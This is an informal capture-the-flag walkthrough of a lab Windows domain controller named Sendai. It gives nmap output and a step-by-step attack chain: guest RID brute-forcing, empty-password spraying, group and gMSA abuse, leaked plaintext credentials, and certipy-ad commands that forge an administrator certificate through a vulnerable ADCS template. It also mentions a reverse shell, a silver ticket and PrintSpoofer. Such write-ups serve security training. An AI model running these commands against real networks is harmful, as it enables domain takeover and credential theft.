<img width="1331" height="347" alt="image" src="https://github.com/user-attachments/assets/dd615dfc-5c8f-49b0-bbe7-2a6a19cd4abc" />53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 13:32:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:30:05
| Not valid after:  2026-08-18T12:30:05
| MD5:   879e:fbc1:988b:964a:e183:6735:66b8:9f3c
|_SHA-1: 099e:0fbb:349b:7fb1:35de:6acb:77a4:c3e5:d0e1:4578
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Issuer: commonName=dc.sendai.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-18T12:39:21
| Not valid after:  2024-07-18T00:00:00
| MD5:   3223:91f5:f1f7:4e16:738e:382d:053e:c7fa
|_SHA-1: 5282:f809:dcc9:8d53:e9a1:065a:25a1:c741:fa2c:4bc5
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:30:05
| Not valid after:  2026-08-18T12:30:05
| MD5:   879e:fbc1:988b:964a:e183:6735:66b8:9f3c
|_SHA-1: 099e:0fbb:349b:7fb1:35de:6acb:77a4:c3e5:d0e1:4578
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:30:05
| Not valid after:  2026-08-18T12:30:05
| MD5:   879e:fbc1:988b:964a:e183:6735:66b8:9f3c
|_SHA-1: 099e:0fbb:349b:7fb1:35de:6acb:77a4:c3e5:d0e1:4578
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.sendai.vl
| Issuer: commonName=dc.sendai.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-09T13:28:31
| Not valid after:  2027-02-08T13:28:31
| MD5:   1ec5:98df:6054:f632:4119:958c:c576:664e
|_SHA-1: e356:a112:e175:c0c8:d835:0db0:c3fb:b62d:a35a:b14a
|_ssl-date: 2026-08-10T13:34:18+00:00; -28s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
54768/tcp open  msrpc         Microsoft Windows RPC
54784/tcp open  msrpc         Microsoft Windows RPC
63422/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
63423/tcp open  msrpc         Microsoft Windows RPC
63433/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows


smb /sendai
anthony.smith               
clifford.davey                
elliot.yates             
lisa.williams                    
susan.harper                      
temp                               
thomas.powell


incident.txt says weak password

netexec smb $ip -u guest -p '' --rid-brute  

sqlsvc
websvc 
staff 
Dorothy.Jones 
Kerry.Robinson
Naomi.Gardner
Anthony.Smith 
Susan.Harper 
Stephen.Simpson 
Marie.Gallagher 
Kathleen.Kelly 
Norman.Baxter 
Jason.Brady 
Elliot.Yates 
Malcolm.Smith 
Lisa.Williams 
Ross.Sullivan 
Clifford.Davey 
Declan.Jenkins 
Lawrence.Grant 
Leslie.Johnson 
Megan.Edwards
Thomas.Powell 
ca-operators
admsv
mgtsvc$
support 

these users have passwords that must change
netexec smb $ip -u users -p '' --continue-on-success
elliot.yates
thomas.powell

bloodhound. thomas.powell and elliot.yates have genericall on group admsvc@sendai.vl  
<img width="964" height="354" alt="image" src="https://github.com/user-attachments/assets/05f36b19-9df1-444c-9dc3-1d97a00fa307" />  

add to group  
<img width="1400" height="289" alt="image" src="https://github.com/user-attachments/assets/e3ec2113-b9f2-4e92-9e52-b829f6ff3f48" />

admsvc can readgmsa password of mgtsvc$  
<img width="1051" height="274" alt="image" src="https://github.com/user-attachments/assets/58380b44-bc4c-42c0-88e5-a63def975428" />

GMSA  
<img width="1331" height="347" alt="image" src="https://github.com/user-attachments/assets/440183af-fa90-4ae1-936a-02b9c1f28099" />

*Evil-WinRM* PS C:\config> type .sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;

get-process shows me ec2 and helpdesk which is sus...?
<img width="846" height="385" alt="image" src="https://github.com/user-attachments/assets/50295753-52d0-4248-a947-8ee2d33735b7" />

Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String ec2
js replace the last select string part
i get clifford.davey password.    RFmoB2WplgE_3p
<img width="1268" height="140" alt="image" src="https://github.com/user-attachments/assets/5bf4e183-2bee-45e6-ab62-44e50c0a9c2c" />

clifford is in CA-OPERATORS. which is related to ADCS
certipy-ad find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip $ip -stdout  
<img width="641" height="67" alt="image" src="https://github.com/user-attachments/assets/c123aaa2-99a8-477e-9cf4-5687506293f1" />

certipy-ad find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip $ip -stdout

certipy-ad template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip $ip -template SendaiComputer -write-default-configuration -no-save 

certipy-ad req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500

certipy-ad auth -pfx administrator.pfx -dc-ip $ip  
<img width="1081" height="329" alt="image" src="https://github.com/user-attachments/assets/aaf37923-1a14-43ba-8314-fc81eb75b6c6" />

ALTERNATIVE
ligolo to sqlsvc  
go into sqlclient but its guest account so u use silver ticket  
get a reverse nc shell  
whoami /priv has seimpersonate  
printspoofer gg  
this was way easier lowk
